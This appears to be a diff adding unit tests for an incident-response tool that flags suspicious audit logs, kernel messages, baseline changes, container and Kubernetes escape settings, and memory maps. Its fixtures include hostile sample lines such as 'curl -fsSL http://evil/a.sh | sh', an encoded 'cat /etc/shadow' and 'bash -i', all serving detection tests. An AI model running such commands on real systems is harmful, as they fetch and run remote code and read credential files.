@@ -744,5 +744,143 @@ class IncidentResponseHeuristicTests(unittest.TestCase):
         self.assertIn('1.2.3.4:5555', output)
 
 
+class DeepTelemetryTests(unittest.TestCase):
+    def test_decode_audit_proctitle(self):
+        encoded = b'bash\x00-i\x00'.hex()
+
+        self.assertEqual(server.decode_audit_proctitle(encoded), 'bash -i')
+        self.assertEqual(server.decode_audit_proctitle('not-hex'), '')
+        self.assertEqual(server.decode_audit_proctitle('abc'), '')
+
+    def test_audit_line_finding_flags_commands_and_daemon_end(self):
+        execve = (
+            'type=EXECVE msg=audit(1.2:3): argc=3 a0="/bin/bash" a1="-c" '
+            'a2="curl -fsSL http://evil/a.sh | sh"'
+        )
+        self.assertIn('shell', server.audit_line_finding(execve))
+        self.assertIn('[!]', server.audit_line_finding(
+            'type=SYSCALL msg=audit(1:1): exe="/tmp/x" comm="x"'
+        ))
+        self.assertIn('[!]', server.audit_line_finding('type=DAEMON_END msg=audit(1:1): res=1'))
+        self.assertIn('[!]', server.audit_line_finding(
+            'type=PROCTITLE msg=audit(1:1): proctitle=' + b'cat\x00/etc/shadow\x00'.hex()
+        ))
+        self.assertIn('[i]', server.audit_line_finding('type=AVC msg=audit(1:1): avc: denied { read }'))
+        self.assertIsNone(server.audit_line_finding(
+            'type=SYSCALL msg=audit(1:1): exe="/usr/sbin/sshd" comm="sshd"'
+        ))
+
+    def test_ebpf_kernel_finding(self):
+        self.assertIn('[!]', server.ebpf_kernel_finding('kernel BUG at net/core/dev.c'))
+        self.assertIn('[!]', server.ebpf_kernel_finding('module verification failed: signature'))
+        self.assertIn('[i]', server.ebpf_kernel_finding('bpf: prog loaded jited'))
+        self.assertIsNone(server.ebpf_kernel_finding('EXT4-fs mounted filesystem'))
+
+    def test_baseline_parsing_and_comparison(self):
+        nonce = 'basenonce'
+        text = (
+            f'@@AUTOIR_BASE:{nonce}:FILES@@\n'
+            f'{"a" * 64}  /etc/passwd\n'
+            f'@@AUTOIR_BASE:{nonce}:USERS@@\n'
+            'root|0|/root|/bin/bash\n'
+            f'@@AUTOIR_BASE:{nonce}:ERR@@\n'
+            'sha256sum: /etc/shadow: Permission denied\n'
+        )
+        sections, errors = server.parse_baseline_output(text, nonce)
+
+        self.assertEqual(sections['files'], f'{"a" * 64}  /etc/passwd')
+        self.assertIn('Permission denied', errors)
+        parsed = server.parse_baseline_section('files', sections['files'])
+        self.assertEqual(parsed['/etc/passwd'], 'a' * 64)
+        self.assertEqual(
+            server.parse_baseline_section('users', sections['users']),
+            ['root|0|/root|/bin/bash'],
+        )
+
+        changes = server.compare_baseline_sections(
+            {'files': {'/etc/passwd': 'a' * 64, '/etc/hosts': 'b' * 64},
+             'users': ['root|0|/root|/bin/bash']},
+            {'files': {'/etc/passwd': 'c' * 64, '/etc/sudoers': 'd' * 64},
+             'users': ['root|0|/root|/bin/bash', 'u|1000|/home/u|/bin/bash']},
+        )
+        summary = {(item['section'], item['change'], item['item']) for item in changes}
+        self.assertIn(('files', 'changed', '/etc/passwd'), summary)
+        self.assertIn(('files', 'removed', '/etc/hosts'), summary)
+        self.assertIn(('files', 'added', '/etc/sudoers'), summary)
+        self.assertIn(('users', 'added', 'u|1000|/home/u|/bin/bash'), summary)
+
+    def test_log_timestamp_gaps(self):
+        timestamp, has_year = server.parse_log_timestamp('Oct 19 10:00:00 host sshd[1]: hi')
+        self.assertIsNotNone(timestamp)
+        self.assertFalse(has_year)
+        gaps = server.log_timestamp_gaps([
+            '2026-10-19T10:00:00 a',
+            '2026-10-19T10:00:01 b',
+            '2026-10-21T10:00:01 c',
+        ])
+        self.assertEqual(len(gaps), 1)
+        self.assertEqual(gaps[0]['seconds'], 172800)
+        self.assertEqual(server.log_timestamp_gaps([
+            'Dec 31 23:59:59 host a',
+            'Jan  1 00:00:01 host b',
+        ]), [])
+        self.assertEqual(server.log_timestamp_gaps([
+            'Oct 19 10:00:05 host a',
+            'Oct 19 10:00:01 host b',
+        ]), [])
+
+    def test_container_escape_findings(self):
+        findings = server.container_escape_findings({
+            'HostConfig': {
+                'Privileged': True,
+                'PidMode': 'host',
+                'CapAdd': ['SYS_ADMIN'],
+                'SecurityOpt': ['seccomp=unconfined'],
+            },
+            'Mounts': [{
+                'Source': '/var/run/docker.sock',
+                'Destination': '/var/run/docker.sock',
+                'RW': True,
+            }],
+        })
+        output = '\n'.join(findings)
+
+        self.assertIn('privileged', output)
+        self.assertIn('host PID', output)
+        self.assertIn('SYS_ADMIN', output)
+        self.assertIn('unconfined', output)
+        self.assertIn('docker.sock', output)
+
+    def test_kubernetes_pod_findings(self):
+        findings = server.kubernetes_pod_findings({
+            'metadata': {'name': 'web', 'namespace': 'prod'},
+            'spec': {
+                'hostNetwork': True,
+                'volumes': [{'name': 'host', 'hostPath': {'path': '/etc'}}],
+                'containers': [{
+                    'name': 'app',
+                    'securityContext': {
+                        'privileged': True,
+                        'capabilities': {'add': ['SYS_ADMIN']},
+                    },
+                }],
+            },
+        })
+        output = '\n'.join(findings)
+
+        self.assertIn('hostNetwork', output)
+        self.assertIn('hostPath', output)
+        self.assertIn('privileged', output)
+        self.assertIn('SYS_ADMIN', output)
+
+    def test_memory_map_finding(self):
+        self.assertIn('[!]', server.memory_map_finding('rwxp', ''))
+        self.assertIn('[!]', server.memory_map_finding('r-xp', '/tmp/payload'))
+        self.assertIn('[!]', server.memory_map_finding('r-xp', '/usr/lib/a.so (deleted)'))
+        self.assertIn('[!]', server.memory_map_finding('r-xp', '/memfd:payload (deleted)'))
+        self.assertIn('[i]', server.memory_map_finding('r-xp', ''))
+        self.assertIsNone(server.memory_map_finding('r-xp', '/usr/lib/libc.so.6'))
+
+
 if __name__ == '__main__':
     unittest.main()
